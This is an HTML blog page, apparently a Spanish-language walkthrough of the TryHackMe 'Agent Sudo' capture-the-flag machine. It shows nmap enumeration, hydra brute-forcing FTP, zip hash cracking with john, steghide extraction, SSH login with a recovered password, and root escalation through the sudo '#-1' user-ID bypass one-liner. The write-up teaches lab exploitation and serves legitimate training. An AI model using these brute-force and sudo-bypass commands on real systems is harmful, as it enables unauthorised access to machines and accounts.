@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>TryHackMe Agent Sudo Writeup</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>TryHackMe Agent Sudo Writeup | Jgarcix Ciberseguridad y Hacking Ético</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="TryHackMe Agent Sudo Writeup" />
+<meta name="author" content="Jgarcix" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="La máquina Agent Sudo, es una máquina de TryHackMe en la que mediante la explotación de un servidor web conseguimos responder a las preguntas que nos plantean, así como el user.txt y el root.txt" />
+<meta property="og:description" content="La máquina Agent Sudo, es una máquina de TryHackMe en la que mediante la explotación de un servidor web conseguimos responder a las preguntas que nos plantean, así como el user.txt y el root.txt" />
+<link rel="canonical" href="https://jgarcix.github.io/TryHackMe-Agent-Sudo-Writeup" />
+<meta property="og:url" content="https://jgarcix.github.io/TryHackMe-Agent-Sudo-Writeup" />
+<meta property="og:site_name" content="Jgarcix Ciberseguridad y Hacking Ético" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-03-26T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="TryHackMe Agent Sudo Writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Jgarcix","url":""},"dateModified":"2023-03-26T00:00:00+00:00","datePublished":"2023-03-26T00:00:00+00:00","description":"La máquina Agent Sudo, es una máquina de TryHackMe en la que mediante la explotación de un servidor web conseguimos responder a las preguntas que nos plantean, así como el user.txt y el root.txt","headline":"TryHackMe Agent Sudo Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://jgarcix.github.io/TryHackMe-Agent-Sudo-Writeup"},"url":"https://jgarcix.github.io/TryHackMe-Agent-Sudo-Writeup"}</script>
+<!-- End Jekyll SEO tag -->
+
+  <link  rel="icon"   href="assets/favicon.png" type="image/png" />
+</head>
+
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>jgarcix@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archivos"><h2 class="header-link">Archivos</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<!--
+  <a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+-->
+
+    </div>
+  </div>
+</header>
+
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>TryHackMe Agent Sudo Writeup</h2>
+  <time datetime="2023-03-26T00:00:00+00:00" class="by-line">26 Mar 2023</time>
+  <p>La máquina Agent Sudo, es una máquina de TryHackMe en la que mediante la explotación de un servidor web conseguimos responder a las preguntas que nos plantean, así como el user.txt y el root.txt</p>
+
+<h1 id="enumeración"><a href="#header-1"></a>Enumeración</h1>
+
+<p>La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.</p>
+
+<p>Usaremos nmap para analizar los puertos abiertos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nv">$IP</span><span class="nt">-VICTIMA</span> <span class="nt">-oG</span> allPorts
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Escaneo todos los puertos abiertos: -p- –open</p>
+  </li>
+  <li>
+    <p>Mediante –min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.</p>
+  </li>
+  <li>
+    <p>Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.</p>
+  </li>
+  <li>
+    <p>Para que el escaneo no aplique resolución DNS usamos -n</p>
+  </li>
+  <li>
+    <p>En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-T5</span> <span class="nt">-n</span> <span class="nt">-vvv</span> <span class="nt">-Pn</span> 10.10.11.79
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-03-26 14:09 EDT
+Initiating Connect Scan at 14:09
+Scanning 10.10.11.79 <span class="o">[</span>65535 ports]
+Discovered open port 80/tcp on 10.10.11.79
+Discovered open port 22/tcp on 10.10.11.79
+Discovered open port 21/tcp on 10.10.11.79
+Completed Connect Scan at 14:09, 23.63s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.11.79
+Host is up, received user-set <span class="o">(</span>0.064s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2023-03-26 14:09:35 EDT <span class="k">for </span>23s
+Not shown: 42735 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>, 22797 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>23.67 seconds
+</code></pre></div></div>
+
+<p>El escaneo nos reporta tres puertos abiertos, el 21, el 22 y el 80, así como el servicio que corre en cada uno de ellos.</p>
+
+<p>Ananalizamos la versión y servicio de estos puertos mediante nmap para sacar más información:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> nmap <span class="nt">-p21</span>,22,80 <span class="nt">-sCV</span> <span class="nt">-Pn</span> <span class="nt">-n</span> 10.10.11.79
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Annoucement
+</code></pre></div></div>
+
+<h1 id="acceso-al-sistema"><a href="$header-1"></a>Acceso al sistema</h1>
+
+<p>Acccedemos mediante el navegador web a la IP-VICTIMA porque el puerto 80 está abierto y nos muestra el siguiente mensaje:</p>
+
+<blockquote>
+  <p>Dear agents, Use your own codename as user-agent to access the site. From, Agent R</p>
+</blockquote>
+
+<p>Si inspeccionamos la página nos reporta que tenemos que cambiar el user-agent a C para acceder al sitio.</p>
+
+<p>Mediante el pluggin user agent switch podemos introducir C en el apartado de user agent y al refrescar la página nos reporta otra información:</p>
+
+<blockquote>
+  <p>Attention chris, Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! From, Agent R</p>
+</blockquote>
+
+<p>-Esto lo podríamos haber hecho con BurpSuite-</p>
+
+<p>Obtenemos un potencial usuario del que sabemos que tiene una contraseña floja. Por ello, intentamos con hydra conectarnos mediante ftp al usuario chris para ver si nos consigue reportar alguna contraseña:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ hydra <span class="nt">-l</span> chris <span class="nt">-P</span> /home/jorge/Descargas/rockyou.txt ftp://10.10.11.79
+Hydra v9.4 <span class="o">(</span>c<span class="o">)</span> 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="k">do </span>not use <span class="k">in </span>military or secret service organizations, or <span class="k">for </span>illegal purposes <span class="o">(</span>this is non-binding, these <span class="k">***</span> ignore laws and ethics anyway<span class="o">)</span><span class="nb">.</span>
+
+Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2023-03-26 14:16:23
+<span class="o">[</span>DATA] max 16 tasks per 1 server, overall 16 tasks, 14344401 login tries <span class="o">(</span>l:1/p:14344401<span class="o">)</span>, ~896526 tries per task
+<span class="o">[</span>DATA] attacking ftp://10.10.11.79:21/
+<span class="o">[</span>21][ftp] host: 10.10.11.79   login: chris   password: ???????
+<span class="o">[</span>STATUS] 14344401.00 tries/min, 14344401 tries <span class="k">in </span>00:01h, 1 to <span class="k">do in </span>00:01h, 15 active
+1 of 1 target successfully completed, 1 valid password found
+Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2023-03-26 14:17:26
+
+</code></pre></div></div>
+
+<p>Obtenemos la contraseña para chris. Nos logeamos y conseguimos tres archivos, dos imágenes y un archivo .txt</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ftp 10.10.11.79
+Connected to 10.10.11.79.
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+Name <span class="o">(</span>10.10.11.79:jorge<span class="o">)</span>: chris
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+ftp&gt; <span class="nb">ls
+</span>229 Entering Extended Passive Mode <span class="o">(||</span>|9859|<span class="o">)</span>
+150 Here comes the directory listing.
+<span class="nt">-rw-r--r--</span>    1 0        0             217 Oct 29  2019 To_agentJ.txt
+<span class="nt">-rw-r--r--</span>    1 0        0           33143 Oct 29  2019 cute-alien.jpg
+<span class="nt">-rw-r--r--</span>    1 0        0           34842 Oct 29  2019 cutie.png
+226 Directory send OK.
+ftp&gt; get To_agentJ.txt
+<span class="nb">local</span>: To_agentJ.txt remote: To_agentJ.txt
+229 Entering Extended Passive Mode <span class="o">(||</span>|15661|<span class="o">)</span>
+150 Opening BINARY mode data connection <span class="k">for </span>To_agentJ.txt <span class="o">(</span>217 bytes<span class="o">)</span><span class="nb">.</span>
+100% |<span class="k">**********************************************</span>|   217        2.55 MiB/s    00:00 ETA
+226 Transfer complete.
+217 bytes received <span class="k">in </span>00:00 <span class="o">(</span>2.79 KiB/s<span class="o">)</span>
+ftp&gt; get 
+To_agentJ.txt   cute-alien.jpg  cutie.png
+ftp&gt; get cute-alien.jpg
+<span class="nb">local</span>: cute-alien.jpg remote: cute-alien.jpg
+229 Entering Extended Passive Mode <span class="o">(||</span>|16430|<span class="o">)</span>
+150 Opening BINARY mode data connection <span class="k">for </span>cute-alien.jpg <span class="o">(</span>33143 bytes<span class="o">)</span><span class="nb">.</span>
+100% |<span class="k">**********************************************</span>| 33143      327.82 KiB/s    00:00 ETA
+226 Transfer complete.
+33143 bytes received <span class="k">in </span>00:00 <span class="o">(</span>178.93 KiB/s<span class="o">)</span>
+ftp&gt; get <span class="nb">cut
+</span>cute-alien.jpg  cutie.png
+ftp&gt; get cutie.png
+<span class="nb">local</span>: cutie.png remote: cutie.png
+229 Entering Extended Passive Mode <span class="o">(||</span>|43706|<span class="o">)</span>
+150 Opening BINARY mode data connection <span class="k">for </span>cutie.png <span class="o">(</span>34842 bytes<span class="o">)</span><span class="nb">.</span>
+100% |<span class="k">**********************************************</span>| 34842      338.21 KiB/s    00:00 ETA
+226 Transfer complete.
+34842 bytes received <span class="k">in </span>00:00 <span class="o">(</span>202.90 KiB/s<span class="o">)</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>To_agentJ.txt
+───────┬───────────────────────────────────────────────────────────────────────────────────
+       │ File: To_agentJ.txt
+───────┼───────────────────────────────────────────────────────────────────────────────────
+   1   │ Dear agent J,
+   2   │ 
+   3   │ All these alien like photos are fake! Agent R stored the real picture inside your 
+       │ directory. Your login password is somehow stored <span class="k">in </span>the fake picture. It shouldn<span class="s1">'t
+       │  be a problem for you.
+   4   │ 
+   5   │ From,
+   6   │ Agent C
+
+</span></code></pre></div></div>
+
+<p>Nos dice que dentro de alguna de las imágenes se encuentra la contraseña.</p>
+
+<p>Mediante 7z podemos observar que la imagen cutie.png es la que contiene un archivo .txt:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ 7z l cutie.png
+
+7-Zip <span class="o">[</span>64] 16.02 : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>es_ES.UTF-8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,64 bits,2 CPUs 11th Gen Intel<span class="o">(</span>R<span class="o">)</span> Core<span class="o">(</span>TM<span class="o">)</span> i5-11400F @ 2.60GHz <span class="o">(</span>A0671<span class="o">)</span>,ASM,AES-NI<span class="o">)</span>
+
+Scanning the drive <span class="k">for </span>archives:
+1 file, 34842 bytes <span class="o">(</span>35 KiB<span class="o">)</span>
+
+Listing archive: cutie.png
+
+<span class="nt">--</span>
+Path <span class="o">=</span> cutie.png
+Type <span class="o">=</span> zip
+Offset <span class="o">=</span> 34562
+Physical Size <span class="o">=</span> 280
+
+   Date      Time    Attr         Size   Compressed  Name
+<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
+2019-10-29 08:29:11 .....           86           98  To_agentR.txt
+<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
+2019-10-29 08:29:11                 86           98  1 files
+
+</code></pre></div></div>
+
+<p>Intentamos extraer la imagen pero hay una contraseña:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ 7z x cutie.png
+
+7-Zip <span class="o">[</span>64] 16.02 : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>es_ES.UTF-8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,64 bits,2 CPUs 11th Gen Intel<span class="o">(</span>R<span class="o">)</span> Core<span class="o">(</span>TM<span class="o">)</span> i5-11400F @ 2.60GHz <span class="o">(</span>A0671<span class="o">)</span>,ASM,AES-NI<span class="o">)</span>
+
+Scanning the drive <span class="k">for </span>archives:
+1 file, 34842 bytes <span class="o">(</span>35 KiB<span class="o">)</span>
+
+Extracting archive: cutie.png
+<span class="nt">--</span>
+Path <span class="o">=</span> cutie.png
+Type <span class="o">=</span> zip
+Offset <span class="o">=</span> 34562
+Physical Size <span class="o">=</span> 280
+
+    
+Enter password <span class="o">(</span>will not be echoed<span class="o">)</span>:
+ERROR: Wrong password : To_agentR.txt
+                    
+Sub items Errors: 1
+
+Archives with Errors: 1
+
+Sub items Errors: 1
+
+</code></pre></div></div>
+
+<p>Vemos que hay un archivo .zip, usaremos binwalk para extraer cutie.png:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cd </span>_cutie.png.extracted
+❯ <span class="nb">ls</span>
+ 365   365.zlib   8702.zip  
+</code></pre></div></div>
+
+<p>Crackeamos con zip2john el archivo .zip y usamos john para crackear el hash:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ zip2john 8702.zip <span class="o">&gt;</span> hash.txt
+❯ john hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>ZIP, WinZip <span class="o">[</span>PBKDF2-SHA1 256/256 AVX2 8x]<span class="o">)</span>
+Cost 1 <span class="o">(</span>HMAC size<span class="o">)</span> is 78 <span class="k">for </span>all loaded hashes
+Will run 2 OpenMP threads
+Proceeding with single, rules:Single
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+Almost <span class="k">done</span>: Processing the remaining buffered candidate passwords, <span class="k">if </span>any.
+Proceeding with wordlist:/usr/share/john/password.lst
+???????          <span class="o">(</span>8702.zip/To_agentR.txt<span class="o">)</span>     
+1g 0:00:00:00 DONE 2/3 <span class="o">(</span>2023-03-26 14:38<span class="o">)</span> 1.298g/s 57719p/s 57719c/s 57719C/s 123456..Peter
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div></div>
+
+<p>Tenemos la contraseña para descomprimir el archivo .zip mediante 7z con:</p>
+
+<blockquote>
+  <p>7z x 8702.zip</p>
+</blockquote>
+
+<p>Nos reporta un archivo .txt que dice lo siguiente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">ls</span>
+ 365   365.zlib   8702.zip   <span class="nb">hash</span>   hash.txt   To_agentR.txt
+❯ <span class="nb">cat </span>To_agentR.txt
+───────┬───────────────────────────────────────────────────────────────────────────────────
+       │ File: To_agentR.txt
+───────┼───────────────────────────────────────────────────────────────────────────────────
+   1   │ Agent C,
+   2   │ 
+   3   │ We need to send the picture to <span class="s1">'QXJlYTUx'</span> as soon as possible!
+   4   │ 
+   5   │ By,
+   6   │ Agent R
+───────┴───────────────────────────────────────────────────────────────────────────────────
+</code></pre></div></div>
+
+<p>Usaremos <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&amp;input=UVhKbFlUVXg">CyberChef</a> para decodear el mensaje.</p>
+
+<p>Tenemos una posible contraseña y el único archivo que nos queda es cute-alien.jpg, lo extraemos con steghide y la contraseña obtenida:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ steghide extract <span class="nt">-sf</span> cute-alien.jpg
+Anotar salvoconducto: 
+anot� los datos extra�dos e/<span class="s2">"message.txt"</span><span class="nb">.</span>
+❯ <span class="nb">ls</span>
+ _cutie.png.extracted   cute-alien.jpg   message.txt
+ binwalk                cutie.png        To_agentJ.txt
+❯ <span class="nb">cat </span>message.txt
+───────┬───────────────────────────────────────────────────────────────────────────────────
+       │ File: message.txt
+───────┼───────────────────────────────────────────────────────────────────────────────────
+   1   │ Hi james,
+   2   │ 
+   3   │ Glad you find this message. Your login password is hackerrules!
+   4   │ 
+   5   │ Don<span class="s1">'t ask me why the password look cheesy, ask agent R who set this password for y
+       │ ou.
+   6   │ 
+   7   │ Your buddy,
+   8   │ chris
+───────┴───────────────────────────────────────────────────────────────────────────────────
+</span></code></pre></div></div>
+
+<p>Tenemos un potencial usuario con una contraseña por lo que nos conectamos mediante ssh y adquirimos la flag del usuario. Por otro lado, para respoder a una de las preguntas de la room de TryHackMe deberemos de obtener la imagen que nos reporta y buscarla en google para localizar como se llama el suceso que representa la imagen:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh james@10.10.11.79
+The authenticity of host <span class="s1">'10.10.11.79 (10.10.11.79)'</span> can<span class="s1">'t be established.
+ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.11.79<span class="s1">' (ED25519) to the list of known hosts.
+james@10.10.11.79'</span>s password: 
+Welcome to Ubuntu 18.04.3 LTS <span class="o">(</span>GNU/Linux 4.15.0-55-generic x86_64<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="k">*</span> Management:     https://landscape.canonical.com
+ <span class="k">*</span> Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Mar 26 17:31:08 UTC 2023
+
+  System load:  0.0               Processes:           97
+  Usage of /:   39.7% of 9.78GB   Users logged <span class="k">in</span>:     0
+  Memory usage: 34%               IP address <span class="k">for </span>eth0: 10.10.11.79
+  Swap usage:   0%
+
+
+75 packages can be updated.
+33 updates are security updates.
+
+
+Last login: Tue Oct 29 14:26:27 2019
+james@agent-sudo:~<span class="nv">$ </span><span class="nb">ls
+</span>Alien_autospy.jpg  user_flag.txt
+james@agent-sudo:~<span class="nv">$ </span><span class="nb">cat </span>user_flag.txt 
+????????????????????
+</code></pre></div></div>
+
+<p>Si buscamos la imagen en google observamos que el suceso es: Roswell Alien Autopsy</p>
+
+<h1 id="escalada-de-privilegios"><a href="$header-1"></a>Escalada de privilegios</h1>
+
+<p>En cuanto a la escalada de privilegios, hacemos sudo -l para ver qué comandos podemos ejecutar como sudo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@agent-sudo:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>james: 
+Sorry, try again.
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>james: 
+Matching Defaults entries <span class="k">for </span>james on agent-sudo:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User james may run the following commands on agent-sudo:
+    <span class="o">(</span>ALL, <span class="o">!</span>root<span class="o">)</span> /bin/bash
+
+</code></pre></div></div>
+
+<p>Buscamos (ALL, !root) para localizar que se trata de una vulnerabilidad para las versiones inferiores a 1.8.28 de sudo en la que ejecutando un comando obtenemos ser root:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@agent-sudo:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> <span class="se">\#</span><span class="k">$((</span><span class="m">0</span>xffffffff<span class="k">))</span> /bin/bash
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>james: 
+root@agent-sudo:~# <span class="nb">whoami
+</span>root
+root@agent-sudo:~# <span class="nb">ls
+</span>Alien_autospy.jpg  user_flag.txt
+root@agent-sudo:~# <span class="nb">cd</span> /root
+root@agent-sudo:/root# <span class="nb">ls
+</span>root.txt
+root@agent-sudo:/root# <span class="nb">cat </span>root.txt 
+To Mr.hacker,
+
+Congratulation on rooting this box. This box was designed <span class="k">for </span>TryHackMe. Tips, always update your machine. 
+
+Your flag is 
+????????????????????????????????
+
+By,
+DesKel a.k.a Agent R
+</code></pre></div></div>
+
+<p>Obtenemos así la flag de root y el nombre de Agent R.</p>
+
+<p>Muchas gracias por leer este Writeup. Espero que te haya gustado mucho!</p>
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://www.instagram.com/jgarcix/">
+    <span>
+        <b>Jgarcix</b>
+    </span>
+    
+    <span>© 2023</span>
+  </a>
+</footer>
+
+
+  
+</body>
+
+</html>
